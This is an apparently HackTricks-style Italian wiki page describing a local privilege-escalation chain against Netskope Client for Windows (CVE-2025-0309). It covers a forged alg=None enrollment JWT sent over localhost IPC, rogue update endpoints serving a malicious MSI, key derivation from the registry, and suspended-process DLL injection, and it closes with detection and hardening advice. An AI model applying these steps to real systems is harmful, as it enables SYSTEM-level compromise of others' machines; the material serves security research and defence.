# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di chain di escalation di privilegi locali Windows trovate in agenti endpoint aziendali e updater che espongono una superficie IPC a basso attrito e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente con privilegi ridotti può costringere l'enrollment verso un server controllato dall'attaccante e poi consegnare un MSI malevolo che il servizio SYSTEM installa.

Idee chiave riutilizzabili contro prodotti simili:
- Abusare della localhost IPC di un servizio privilegiato per forzare il re‑enrollment o la riconfigurazione verso un server controllato dall'attaccante.
- Implementare gli endpoint di update del vendor, fornire una Trusted Root CA rogue, e puntare l'updater a un pacchetto maligno “signed”.
- Evitare controlli di firma deboli (CN allow‑lists), flag opzionali di digest, e proprietà MSI permissive.
- Se l'IPC è “encrypted”, derivare la key/IV da identificatori di macchina leggibili da tutti memorizzati nel registro.
- Se il servizio restringe i chiamanti per image path/process name, iniettare in un processo allow‑listed o spawnarne uno suspended e bootstrapare la tua DLL tramite una patch minimale del thread‑context.

---
## 1) Forzare l'enrollment verso un server dell'attaccante via localhost IPC

Molti agent includono un processo UI in user‑mode che comunica con un servizio SYSTEM tramite localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (bassa integrità) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Crea un token JWT di enrollment i cui claim controllano l'host backend (es. AddonUrl). Usa alg=None così non è richiesta alcuna firma.
2) Invia il messaggio IPC che invoca il comando di provisioning con il tuo JWT e il nome del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a colpire il tuo server rogue per enrollment/config, p.es.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del caller è basata su path/nome, origina la richiesta da un vendor binary allow‑listed (vedi §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint attesi e instradalo verso un MSI dell'attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo di aggiornamento molto breve, p.es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA in formato PEM. Il servizio lo installa nello Local Machine Trusted Root store.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione falsa.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: il servizio potrebbe controllare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare l'MSI.
- CERT_DIGEST property: includi una proprietà MSI benign chiamata CERT_DIGEST. Nessuna applicazione al momento dell'installazione.
- Optional digest enforcement: un flag di config (es., check_msi_digest=false) disabilita la validazione crittografica aggiuntiva.

Result: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope ha incapsulato l'IPC JSON in un campo encryptData che sembra Base64. Reversing ha mostrato AES con key/IV derivati da valori di registro leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare comandi criptati validi da un utente standard. Suggerimento generale: se un agent improvvisamente “critta” il suo IPC, cerca device IDs, product GUIDs, install IDs sotto HKLM come material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Alcuni servizi tentano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine con vendor binaries allow‑listati situati sotto Program Files (es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo allow‑listato (es., nsdiag.exe) e proxy dell'IPC dall'interno.
- Avviare un vendor binary allow‑listato in stato suspended e bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole di tamper imposte dal driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

I prodotti spesso distribuiscono un minifilter/OB callbacks driver (es., Stadrv) per rimuovere diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader affidabile in user‑mode che rispetta questi vincoli:
1) CreateProcess di un vendor binary con CREATE_SUSPENDED.
2) Ottenere gli handle ancora permessi: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo, e un handle thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME se patchi il codice a un RIP noto).
3) Sovrascrivere ntdll!NtContinue (o un altro thunk mappato precocemente e garantito) con una piccola stub che chiama LoadLibraryW sul percorso della tua DLL, poi ritorna.
4) ResumeThread per attivare la stub in‑process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (tu l'hai creato), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizza una rogue CA, la firma di un MSI malevolo, e fornisce gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un IPC client custom che costruisce messaggi IPC arbitrari (opzionalmente AES‑encrypted) e include l'injection tramite processo sospeso per farli originare da un binary allow‑listato.

---
## 7) Detection opportunities (blue team)
- Monitorare le aggiunte al Local Machine Trusted Root. Sysmon + registry‑mod eventing (vedi SpecterOps guidance) funziona bene.
- Segnalare esecuzioni di MSI avviate dal servizio dell'agent da percorsi come C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Revisionare i log dell'agent per host/tenant di enrollment inaspettati, es.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – cercare anomalie in addonUrl / tenant e provisioning msg 148.
- Allertare su client IPC localhost che non sono i signed binaries attesi, o che originano da alberi di processi figli insoliti.

---
## Hardening tips for vendors
- Vincolare enrollment/update hosts a una allow‑list rigorosa; rifiutare domini non trusted nel clientcode.
- Autenticare i peer IPC con primitive OS (ALPC security, named‑pipe SIDs) invece di controlli su image path/name.
- Tenere il materiale secret fuori da HKLM leggibile da tutti; se l'IPC deve essere encrypted, derivare le chiavi da secret protetti o negoziare su canali autenticati.
- Trattare l'updater come una superficie supply‑chain: richiedere una catena completa verso una CA trusted che controlli, verificare le firme dei package rispetto a chiavi pinned, e fallire closed se la validazione è disabilitata in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
